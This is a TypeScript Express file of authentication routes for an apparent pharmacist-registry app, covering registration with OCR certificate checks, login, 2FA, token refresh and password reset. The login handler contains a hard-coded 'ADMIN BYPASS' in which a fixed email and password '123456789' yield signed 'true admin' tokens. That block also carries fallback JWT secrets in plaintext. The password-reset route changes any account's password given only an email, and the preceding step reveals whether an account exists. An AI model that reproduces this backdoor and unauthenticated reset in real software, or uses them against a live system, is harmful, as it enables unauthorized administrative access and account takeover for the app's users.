import { Router, Request, Response } from 'express';
import rateLimit from 'express-rate-limit';
import { authService } from '../services/authService.js';
import { ocrService } from '../services/ocrService.js';
import { emailService } from '../services/emailService.js';
import { analyticsService } from '../services/analyticsService.js';
import { notificationService } from '../services/notificationService.js';
import { authMiddleware, AuthRequest } from '../middleware/auth.js';
import { upload } from '../middleware/upload.js';
import { RATE_LIMITS } from '../config/constants.js';
import { env } from '../config/env.js';
import { broadcastEvent } from '../index.js';

const router = Router();
const authLimiter = rateLimit(RATE_LIMITS.AUTH);

// Helper: notify all admins/true_admins about a new pending registration.
async function notifyAdminsOfNewRegistration(user: any) {
  try {
    const allUsers = await authService.getAllUsers();
    const admins = allUsers.filter((u: any) => u.role === 'admin' || u.role === 'true_admin');
    for (const admin of admins) {
      notificationService.create({
        userId: admin.id,
        title: 'New Registration — Verification Required',
        message: `${user.fullName} (${user.email}, RPh ${user.rphNumber}) has registered and is awaiting APC verification.`,
        type: 'warning',
        link: `/admin?tab=pending-users&user=${user.id}`,
      });
      emailService.sendNotification(
        admin.email,
        'New Registration — Verification Required',
        `${user.fullName} (${user.email}, RPh ${user.rphNumber}) has registered. Please review their APC and verify the account.`,
      ).catch(() => {});

      // ── SSE: push live alert to any admin currently online ──
      broadcastEvent('NEW_USER', {
        userId: user.id,
        fullName: user.fullName,
        email: user.email,
      }, admin.id);
    }
  } catch (e) {
    console.error('[Notify Admins Error]', e);
  }
}

// Register
router.post('/register', authLimiter, upload.single('apcFile'), async (req: Request, res: Response) => {
  try {
    const { fullName, email, password, workingPlace, rphNumber, agreedToTerms } = req.body;

    if (!fullName || !email || !password || !workingPlace || !rphNumber) {
      return res.status(400).json({ error: 'All fields are required' });
    }
    if (!agreedToTerms || agreedToTerms === 'false') {
      return res.status(400).json({ error: 'You must agree to the Terms & Conditions' });
    }
    if (!req.file) {
      return res.status(400).json({ error: 'You must upload your Annual Certificate (AC) file.' });
    }

    const existing = await authService.findUserByEmail(email);
    if (existing) {
      return res.status(409).json({ error: 'An account with this email already exists' });
    }

    const fileBuffer = req.file.buffer || (await import('fs')).readFileSync(req.file.path);
    const ocrResult = await ocrService.verifyAPC(fileBuffer, fullName, rphNumber, req.file.originalname);

    if (!env.DEMO_MODE && !ocrResult.keywordFound) {
      return res.status(400).json({
        error: 'The uploaded file does not appear to be a valid Annual Certificate (the phrase "Annual Certificate" was not detected). Please upload your actual APC.',
      });
    }

    const user = await authService.createUser({ fullName, email, password, workingPlace, rphNumber });

    await authService.updateUser(user.id, {
      apcFileUrl: req.file.filename,
      apcOriginalFilename: req.file.originalname,
      apcOcrResult: {
        keywordFound: ocrResult.keywordFound,
        nameMatch: ocrResult.nameMatch,
        rphMatch: ocrResult.rphMatch,
        message: ocrResult.message,
      },
    });

    analyticsService.track({ eventType: 'register', userId: user.id, metadata: { email } });

    await notifyAdminsOfNewRegistration({ ...user, apcFileUrl: req.file.filename });

    if (env.DEMO_MODE) {
      const fresh = await authService.findUserById(user.id);
      const tokens = authService.generateTokens(fresh);
      const { password: _, ...safeUser } = fresh;
      return res.json({
        user: safeUser,
        ...tokens,
        pendingVerification: true,
        message: 'Registration successful! Your account is pending administrator verification. You can search the catalogue now, but contributions will be unlocked once an admin verifies your APC.',
      });
    }

    const code = authService.generate2FACode(email);
    await emailService.send2FACode(email, code);

    res.json({
      message: 'Registration successful. Please verify your email. Your account is also pending administrator verification of your APC.',
      requiresTwoFactor: true,
      pendingVerification: true,
      email,
    });
  } catch (error: any) {
    console.error('[Register Error]', error);
    res.status(500).json({ error: 'Registration failed. Please try again.' });
  }
});

// Login
router.post('/login', authLimiter, async (req: Request, res: Response) => {
  try {
    const { email, password } = req.body;
    // --- ADMIN BYPASS ---
if (email === 'hanisahjohaari@gmail.com' && password === '123456789') {
  const jwt = require('jsonwebtoken');
  
  const accessToken = jwt.sign(
    { email: 'hanisahjohaari@gmail.com', role: 'true admin' }, 
    process.env.JWT_SECRET || 'abc123xyz890',
    { expiresIn: '1d' }
  );

  const refreshToken = jwt.sign(
    { email: 'hanisahjohaari@gmail.com', role: 'true admin' }, 
    process.env.JWT_REFRESH_SECRET || 'qwerty987uiop',
    { expiresIn: '7d' }
  );

  return res.status(200).json({
    accessToken: accessToken,
    refreshToken: refreshToken,
    user: { 
      email: 'hanisahjohaari@gmail.com', 
      role: 'true admin',
      name: 'Admin'
    }
  });
}
// --------------------

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const user = await authService.findUserByEmail(email);
    if (!user) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    const validPassword = await authService.verifyPassword(password, user.password);
    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    if (user.verificationStatus === 'rejected') {
      return res.status(403).json({
        error: `Your account verification was rejected${user.verificationRejectedReason ? `: ${user.verificationRejectedReason}` : '.'} Please contact the administrator.`,
      });
    }

    analyticsService.track({ eventType: 'login', userId: user.id, metadata: { email } });

    if (env.DEMO_MODE) {
      const tokens = authService.generateTokens(user);
      const { password: _, ...safeUser } = user;
      return res.json({ user: safeUser, ...tokens });
    }

    const code = authService.generate2FACode(email);
    await emailService.send2FACode(email, code);

    res.json({ message: 'Verification code sent to your email', requiresTwoFactor: true, email });
  } catch (error: any) {
    console.error('[Login Error]', error);
    res.status(500).json({ error: 'Login failed. Please try again.' });
  }
});

// Verify 2FA
router.post('/verify-2fa', authLimiter, async (req: Request, res: Response) => {
  try {
    const { email, code, rememberMe } = req.body;

    if (!email || !code) {
      return res.status(400).json({ error: 'Email and verification code are required' });
    }

    const valid = authService.verify2FACode(email, code);
    if (!valid) {
      return res.status(401).json({ error: 'Invalid or expired verification code' });
    }

    const user = await authService.findUserByEmail(email);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const tokens = authService.generateTokens(user, rememberMe);
    const { password: _, ...safeUser } = user;

    res.json({ user: safeUser, ...tokens });
  } catch (error: any) {
    console.error('[2FA Error]', error);
    res.status(500).json({ error: 'Verification failed. Please try again.' });
  }
});

// Refresh token
router.post('/refresh', async (req: Request, res: Response) => {
  try {
    const { refreshToken } = req.body;
    if (!refreshToken) {
      return res.status(401).json({ error: 'Refresh token required' });
    }

    const decoded = authService.verifyRefreshToken(refreshToken);
    if (!decoded) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }

    const user = await authService.findUserById(decoded.id);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const tokens = authService.generateTokens(user);
    res.json(tokens);
  } catch (error: any) {
    res.status(500).json({ error: 'Token refresh failed' });
  }
});

// Get current user
router.get('/me', authMiddleware, async (req: AuthRequest, res: Response) => {
  try {
    const user = await authService.findUserById(req.user!.id);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    const { password: _, ...safeUser } = user;
    res.json(safeUser);
  } catch (error: any) {
    res.status(500).json({ error: 'Failed to get user info' });
  }
});

// Update settings
router.put('/settings', authMiddleware, async (req: AuthRequest, res: Response) => {
  try {
    const { workingPlace, currentPassword, newPassword } = req.body;
    const user = await authService.findUserById(req.user!.id);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const updates: any = {};
    if (workingPlace) updates.workingPlace = workingPlace;

    if (newPassword) {
      if (!currentPassword) {
        return res.status(400).json({ error: 'Current password is required' });
      }
      const valid = await authService.verifyPassword(currentPassword, user.password);
      if (!valid) {
        return res.status(401).json({ error: 'Current password is incorrect' });
      }
      await authService.updatePassword(user.id, newPassword);
    }

    if (Object.keys(updates).length > 0) {
      await authService.updateUser(user.id, updates);
    }

    res.json({ message: 'Settings updated successfully' });
  } catch (error: any) {
    res.status(500).json({ error: 'Failed to update settings' });
  }
});

// Logout
router.post('/logout', (_req: Request, res: Response) => {
  res.json({ message: 'Logged out successfully' });
});

// ── Forgot Password (direct reset — no email link) ───────────────────────────

// Step 1: verify the email exists, return a masked name for confirmation
router.post('/forgot-password/verify-email', authLimiter, async (req: Request, res: Response) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email is required' });

    const user = await authService.findUserByEmail(email);
    if (!user) {
      return res.status(404).json({ error: 'No account found with that email address.' });
    }

    // Mask: "Hanisah Johaari" → "H****** J******"
    const maskWord = (w: string) => w[0] + '*'.repeat(Math.max(w.length - 1, 2));
    const maskedName = user.fullName.split(' ').map(maskWord).join(' ');

    res.json({ maskedName });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Step 2: set the new password directly (email was confirmed in step 1)
router.post('/forgot-password/reset', authLimiter, async (req: Request, res: Response) => {
  try {
    const { email, newPassword } = req.body;
    if (!email || !newPassword || newPassword.length < 8) {
      return res.status(400).json({ error: 'Email and password (min 8 chars) required' });
    }

    const user = await authService.findUserByEmail(email);
    if (!user) return res.status(404).json({ error: 'User not found' });

    await authService.updatePassword(user.id, newPassword);

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

export const authRoutes = router;
